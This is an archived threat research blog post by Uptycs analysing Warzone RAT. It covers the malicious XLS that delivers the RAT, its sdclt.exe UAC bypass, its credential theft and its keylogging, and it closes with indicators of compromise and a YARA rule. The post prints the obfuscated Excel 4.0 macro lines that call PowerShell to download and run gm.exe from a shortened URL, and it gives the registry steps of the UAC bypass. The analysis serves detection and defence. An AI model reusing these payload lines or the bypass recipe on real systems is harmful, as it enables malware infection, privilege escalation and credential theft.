{
    "id": "7f22a0c4-7c3d-4db8-aa37-54a9c263ec13",
    "created_at": "2023-01-12T15:08:00.448867Z",
    "updated_at": "2025-03-27T02:06:06.308084Z",
    "deleted_at": null,
    "sha1_hash": "830ddb77c839c067c568b894af058cdae9e30aa6",
    "title": "2020-11-25 - Warzone RAT comes with UAC bypass technique",
    "authors": "",
    "file_creation_date": "2022-05-29T00:53:11Z",
    "file_modification_date": "2022-05-29T00:53:11Z",
    "file_size": 1674043,
    "plain_text": "# Warzone RAT comes with UAC bypass technique\n\n**[uptycs.com/blog/warzone-rat-comes-with-uac-bypass-technique](https://www.uptycs.com/blog/warzone-rat-comes-with-uac-bypass-technique)**\n\nUptycs' threat research team identified an XLS document that downloaded a highly vicious\npayload named Warzone RAT. The payload, also known as “Ave Maria stealer,” can steal\n[credentials and log keystrokes on the victim’s machine. Checkpoint mentioned Warzone](https://research.checkpoint.com/2020/warzone-behind-the-enemy-lines/)\nearly this year when the malware was in its early stage of development.\n\nThe latest version of the malware is fully developed and is being sold in the underground\nmarket. The Warzone authors have an official website where cybercriminals can buy the\nmalware.\n\nThe site lists various features of the RAT and the pricing (the RAT can be rented for $22.95\nper month and $49.95 for three months).\n\n\n-----\n\n_Figure 1: Warzone RAT official website._\n\nThe Warzone developers rent out several products on their website:\n\nRAT\nRAT Poison\nCrypter\nSILENT.doc exploit\nSILENT EXCEL Exploit\n\nHere are various features of the RAT noted on the website:\n\nNative, independent stub\nRemote Desktop\nHidden Remote Desktop - HRDP\nPrivilege Escalation - UAC Bypass\n\n\n-----\n\nRemote WebCam\nPassword Recovery\nFile Manager\nDownload & Execute\nLive Keylogger\nOffline Keylogger\nRemote Shell\nProcess Manager\nReverse Proxy\nAutomatic Tasks\nMass Execute\nSmart Updater\nHRDP WAN Direct Connection\nPersistence\nWindows Defender Bypass\n\nWe also discovered a cracked version of Warzone hosted on GitHub. Here’s a screenshot of\nthe repo:\n\n_Figure 2: A cracked version of Warzone on GitHub._\n\n\n-----\n\nThe instance of Warzone we trapped has the ability to bypass UAC on the latest version of\nWindows 10. In this blog we’re going to talk about the XLS used as the attack vector and the\nUAC bypass technique used.\n\n## The malicious XLS\n\nThe XLS used in the attack uses Excel 4.0 Macro, also known as XLM Macro. The XLM\nMacro feature has been part of Microsoft Excel for a long time, but we’ve seen a spike in its\nmalicious usage for a few months now. Malware authors exploit this feature of Excel, which\nallows formulas to be written using macros.\n\nWhen we got hold of the XLS on November 11, only a few of the anti-malware vendors could\ndetect it on Virustotal (see figure 3).\n\n_Figure 3: Detections on Virustotal._\n\nIn the XLS file, the macros are implemented as formulas in a hidden sheet and are not\nvisible if the XLS is opened. The macros are visible only after unhiding the sheet. The\nfollowing screenshot shows the unhidden sheet with macro code embedded in the formula.\n\n\n-----\n\n_Figure 4: Macro in unhidden sheet._\n\nHere’s the macro code in respective rows and columns:\n\n**Row 596 column E -**\n=CHAR(99)&CHAR(109)&CHAR(100)&CHAR(32)&CHAR(47)&CHAR(99)&\"powe^rshell\n-w 1 (nEw-oBje`cT Net.WebcL`IENt).('Down'+'loadFile').\"\"\"\"Invoke\"\"\"\"\n('https://cutt.ly/agJgRCy','gm.exe')\"\n**Row 597 column E -**\n=CHAR(99)&CHAR(109)&CHAR(100)&CHAR(32)&CHAR(47)&CHAR(99)&\"powe^rshell\n-w 1 stARt`-slE`Ep 20; Move-Item \"\"gm.exe\"\" -Destination \"\"${enV`:appdata}\"\"\"\n**Row 598 column E -**\n=CHAR(99)&CHAR(109)&CHAR(100)&CHAR(32)&CHAR(47)&CHAR(99)&\"powe^rshell\n-w 1 stARt`-slE`Ep 25; cd ${enV`:appdata}; ./gm.exe\"\n\nThese macros are responsible for downloading and executing the Warzone RAT. The\nWarzone payload takes full control of the system after bypassing UAC and then steals\ninformation and monitors the victim’s machine.\n\nHere’s the flow of the attack:\n\nThe macro in the XLS file uses PowerShell to download and execute gm.exe, which is\nthe Warzone RAT\nGm.exe bypasses UAC to run at high integrity level\nGm.exe copies itself to %programdata% with the name Images.exe and then executes\nit. Images.exe runs at high integrity level\n\nThe image below describes the flow of the attack.\n\n\n-----\n\n_Figure 5: The flow of attack._\n\n## The Warzone RAT payload: Win over the UAC\n\nThe Warzone RAT (gm.exe) is a 32-bit application and uses the sdclt.exe to bypass UAC\nand run at higher privileges. Sdclt.exe is a built-in Windows utility used for backup and\nrestore purposes. Sdclt is designed to autoevelate its privilege and uses the control panel\nbinary, control.exe, to back up and restore control panel settings.\n\n[There are many UAC bypass techniques that are not effective on Windows 10 because of](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md)\nthe default file system restrictions. A 32-bit application can’t access the native\nc:\\windows\\system32 directory because the operating system redirects the request to\nc:\\windows\\SysWOW64. Sdclt.exe and other UAC bypass binaries are 64-bit applications\nand are not available in the SysWOW64 directory.\n\nHowever, the operating system provides a mechanism to disable the file system redirection\nusing Wow64DisableWow64FsRedirection API. So Warzone uses the\nWow64DisableWow64FsRedirection API to disable the file system redirection to access the\nsdclt.exe that resides in the system32 directory (see figure 6, below).\n\n\n-----\n\n_Figure 6: The call to the Wow64DisableWow64FsRedirection API disables file system_\n_redirection for a 32-bit application._\n\nAfter disabling the redirection, the malware makes the following registry changes:\n\nCreates a new registry key HKCU\\Software\\Classes\\Folder\\shell\\open\\command\nSets the “Default” value to “path of the malware”\nCreates a value “DelegateExecute” and sets the value to “0”\nExecutes %systemDirectory%sdclt.exe to bypass the UAC as shown below (figure 7)\n\n\n-----\n\n_Figure 7: The malware sets registry keys and calls sdclt.exe to bypass UAC._\n\nThis step elevates the privilege of the malicious process and executes it at high integrity as\nshown in the image below (figure 8).\n\n_Figure 8: Images.exe runs at a higher integrity level._\n\nThe Warzone RAT can steal passwords from the following browsers:\n\nGoogle Chrome\nEpic Privacy Browser\nMicrosoft Edge\nOpera\nTencent QQ Browser\nBrave Browser\nCenterBrowser\nBlisk\nTorch Browser\nSlimjet browser\n\nIt steals the passwords that are stored in the browser databases. The following screenshot\n(figure 9) shows the query used to extract saved credentials in the browser.\n\n\n-----\n\n_Figure 9: RAT stealing passwords from the browser._\n\nThe Warzone RAT can steal credentials from the Outlook and Thunderbird email clients as\nshown in the image below (figure 10).\n\n_Figure 10: RAT stealing passwords from email clients._\n\nThe RAT also has a keylogger component that uses the GetAsyncState Windows API to log\nkeystrokes (see figure 11).\n\n\n-----\n\n_Figure 11: Keylogger code using GetAsyncState API._\n\nThe following screenshot (figure 12) shows the part of keylogger code that handles the\nlogging of special keys TAB, BKSP, ESC, CAPS, CTRL, etc.\n\n_Figure 12: Keylogger code to handle special keys._\n\nHere are some more strings that can be used to identify and detect the unpacked Warzone\npayload inside memory:\n\nwarzone160\n\n\n-----\n\nAve_Maria Stealer OpenSource github Link: https://github.com/syohex/java-simplemine-sweeper\nC:\\Users\\Vitali Kremez\\Documents\\MidgetPorn\\workspace\\MsgBox.exe\n\nUptycs EDR detection\n\n_Figure 13: Uptycs alerts._\n\n_Figure 14: Uptycs process graph._\n\nMalware authors are always hunting for techniques that can bypass security. As mentioned\nearlier, the UAC bypass technique used by Warzone works on the latest version of Windows\n10. We are seeing an increase in usage of the technique. In our intelligence database we\nhave encountered some additional malware that uses the same technique to bypass UAC.\nBelow is a screenshot (figure 15) of a VBA macro code found in an .xlsm sample (SHA25670d400cbacc02f2417e742608c626c52698b07a42de3eb6e1ff4fea17d5bc0b6) using the API.\n\n\n-----\n\n_Figure 15: VBA macro using Wow64DisableWoW64FsRedirection API._\n\n## Indicator of compromise\n\n### SHA256\n\nXLS-401634497f93067541d5d5a7d7511f7486684b2076034f8d5b205a274750e90b\nWarZone RAT55ff46cb70e9b4a326776e45a540e48166d04463c4f91de117528e487ce62b2c\n\n### Files dropped\n\n%AppData%gm.exe\n%ProgramData%Images.exe\n\n### Registry changes\n\n1. Key: HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\n\n**Value Images data: %programdata%images.exe**\n\n**Key: HKCU\\Software\\Classes\\Folder\\shell\\open\\command**\n\n**Value: Default data: %appdata%gm.exe**\n**Value: DelegateExecute data: 0**\n\n### URLs\n\nhxxps://cutt.ly/agJgRCy/gm.exe\n\n## YARA rule\n\n\n-----\n\n```\nrule Warzone_RAT {\n  meta:\n     description=\"warzone RAT -Memory\"\n     author = \"abhijit mohanta\"\n     date = \"15 Oct 2020\"\n  strings:\n     $Warzone0 = \"warzone160\" ascii wide nocase\n     $Warzone1 = \"[ENTER]\" ascii wide nocase\n     $Warzone2 = \"[BKSP]\" ascii wide nocase\n     $Warzone3 = \"[TAB]\" ascii wide nocase\n     $Warzone4 = \"[CTRL]\" ascii wide nocase\n     $Warzone5 = \"[ALT]\" ascii wide nocase\n     $Warzone6 = \"[CAPS]\" ascii wide nocase\n     $Warzone7 = \"[ESC]\" ascii wide nocase\n     $Warzone8 = \"[INSERT]\" ascii wide nocase\n  condition:\n     all of ($Warzone*)\n}\n\n```\nThanks to Shilpesh Trivedi and the rest of the Uptycs threat research team for their\ncontributions.\n\nTag(s): [vulnerability assessment,](https://www.uptycs.com/blog/tag/vulnerability-assessment) [threat management,](https://www.uptycs.com/blog/tag/threat-management) [threat research](https://www.uptycs.com/blog/tag/threat-research)\n\n## Abhijit Mohanta\n\nAbhijit Mohanta has 13+ years of experience in the field of cybersecurity. He is author of\nbooks Malware Analysis and Detection Engineering from Springer Apress and Preventing\nRansomware from Packt. He has several patents in his name and has been a speaker in\nwell-known conferences like AVAAR and DSCI. He has worked...\n\nConnect with the author\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-11-25 - Warzone RAT comes with UAC bypass technique.pdf"
    ],
    "report_names": [
        "2020-11-25 - Warzone RAT comes with UAC bypass technique.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536080,
    "ts_updated_at": 1743041166,
    "ts_creation_date": 1653785591,
    "ts_modification_date": 1653785591,
    "files": {
        "pdf": "https://archive.orkl.eu/830ddb77c839c067c568b894af058cdae9e30aa6.pdf",
        "text": "https://archive.orkl.eu/830ddb77c839c067c568b894af058cdae9e30aa6.txt",
        "img": "https://archive.orkl.eu/830ddb77c839c067c568b894af058cdae9e30aa6.jpg"
    }
}